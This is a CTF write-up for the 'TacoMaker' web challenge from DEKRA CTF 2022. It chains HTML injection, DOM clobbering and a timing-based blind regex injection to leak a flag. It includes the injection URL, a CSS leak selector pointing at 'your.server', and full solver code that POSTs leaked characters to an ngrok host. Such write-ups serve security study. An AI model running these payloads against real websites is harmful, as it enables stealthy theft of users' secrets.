# TacoMaker @ DEKRA CTF 2022

## Description
What a taco to be alive!

## Solution

HTML Injection (CSP is very strict by blocklisting scripts by their sha256 hash) leading to DOM Clobbering to create a valid reference to `window.config`, `window.config.dev` and `window.ingredient`. Setting `window.ingredient`'s `href` will make its reference return a valid string which is then appended to a GET parameter value. Since `web.py:25` uses the last `ingredient` value, we may pollute the query by adding another `ingredient` value. After some checks in `getTaco` to make sure the query comes from selenium in the chall's origin (since referer header can't be changed by JS, only *shared* by using `no-referer` policy), there's a `re.match` call using previosuly-seen `ingredient` value as the regular expression it will be executing. By applying a technique like `forward search` (`foo(((.*)*)*)!`), when `foo` does exist, the rest of the expression takes exponential time to load. 

The side channel technique consists of checking the document's active element once an iframe hosting the challenge's page has been loaded. Since a `div` gets focused once the image has been loaded, checking if the active elements keeps being the document's body after a while means the iframe hasn't been loaded (or it is still loading), and so the regular expression works.

```
http://chall/?taco_name=<a id=config></a><a id=config name=dev></a><a id=ingredient href="//foo.bar/&ingredient=REGEX_INJECTION"></a>
```

## Extra

### CSS leak (patched) (@julianjm)

`img[src=^='static/taco3.jpg']{backgroud-image: url(your.server)}`

https://vwzq.net/slides/2019-s3_css_injection_attacks.pdf

https://github.com/d0nutptr/sic

### URL parsing inconsistency/confusion (@hanstopoman)

`/.png;/../` -> chrome `/` & urlparse `/.png`

Unexploitable because a GET parameter is needed, thus providing a `?` like `/.png?something;/../` would make `something;/../` seen as GET data. 

https://claroty.com/wp-content/uploads/2022/01/Exploiting-URL-Parsing-Confusion.pdf

## solver.py

```py
from flask import Flask, request
from sys import stderr
from os import environ
import logging
import re

# Disable ALL flask output
logging.getLogger('werkzeug').disabled = True
environ['WERKZEUG_RUN_MAIN'] = 'true'

app = Flask(__name__)
flag = "FLAG{"


@app.route('/solve.png', methods=['GET'])
def get_file():
    global flag
    return open('solver.html').read().replace("FLAGHERE", flag.replace("\\", "\\\\"))


@app.route('/exfil', methods=['POST'])
def exfil():
    print(request.data.decode())
    return ""


@app.route('/setFlag', methods=['POST'])
def setflag():
    global flag
    flag = request.data.decode()
    print("Flag: " + flag)
    return ""


if __name__ == "__main__":
    app.run(port=1337)
```

## solver.html

```js
const EXFIL_URL = 'http://x.ngrok.io'
const CHALL_URL = 'http://tacomaker:4000'
const ALPHABET = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ%-'\\\"!¡¿?&(),/:;<=>@[]_`{}~".split(""); // python's string.printable
const CLOBBERING = '<a id=config></a><a id=config name=dev></a><a id=ingredient href="//foo.bar/&ingredient=INJECTION"></a>'
var known = "FLAGHERE", opened = 0;
const PARALLEL_WINDOWS = 5;

// https://developer.mozilla.org/es/docs/Web/JavaScript/Guide/Regular_Expressions
function escapeRegExp(string) {
    return string.replace(/[.*+\-?^$()|[\]\\]/g, '\\$&');
}

async function exfil(msg) {
    console.log(msg)
    await fetch(`${EXFIL_URL}/exfil`, { method: 'POST', body: msg, mode: 'no-cors' })
}

async function setFlag(flag) {
    await fetch(`${EXFIL_URL}/setFlag`, { method: 'POST', body: flag, mode: 'no-cors' })
}

async function leak(char) {
    let win = window.open(`${location.href}?foo`, "_blank"); // ?foo => location.search
    exfil(`Testing ${known}(${char}) - ${opened}`); // await may make the script take too long
    win.addEventListener("load", function () {
        win.postMessage({ 'regex': `${encodeURIComponent(escapeRegExp(known + char))}(((((.*)*)*)*)*)!`, 'flag': `${known + char}` }, "*");
    })
}

if (location.search.substr(1)) {

    // sub
    window.addEventListener("message", (event) => {
        var frame = document.createElement('iframe')
        let param = encodeURIComponent(CLOBBERING.replace('INJECTION', event.data.regex))
        frame.src = `${CHALL_URL}/?taco_name=${param}`

        frame.onload = function () {
            let counter = 0
            setInterval((() => {
                if (document.activeElement != document.body) {
                    event.source.postMessage("foo", "*")
                } else {
                    if (counter > 3) { // 5s
                        event.source.postMessage(event.data.flag, "*")
                    } else {
                        counter++;
                    }
                }
            }), 1000)
        }

        document.body.appendChild(frame);

    });

} else {

    // main
    window.addEventListener("message", (event) => {
        if (event.data != "foo") {
            known = event.data;
            setFlag(known)
        }
        event.source.close()
        opened--
    });


    let iterator = 0;

    setInterval((() => {
        if (opened <= PARALLEL_WINDOWS) {
            leak(ALPHABET[iterator])
            opened++

            if (iterator == ALPHABET.length - 1) {
                iterator = 0;
            } else {
                ++iterator;
            }
        }
    }), 100)
}
```

## References

https://terjanq.medium.com/dom-clobbering-techniques-8443547ebe94

https://stackoverflow.com/questions/1599660/which-html-elements-can-receive-focus

https://blog.p6.is/time-based-regex-injection/ , https://diary.shift-js.info/blind-regular-expression-injection/
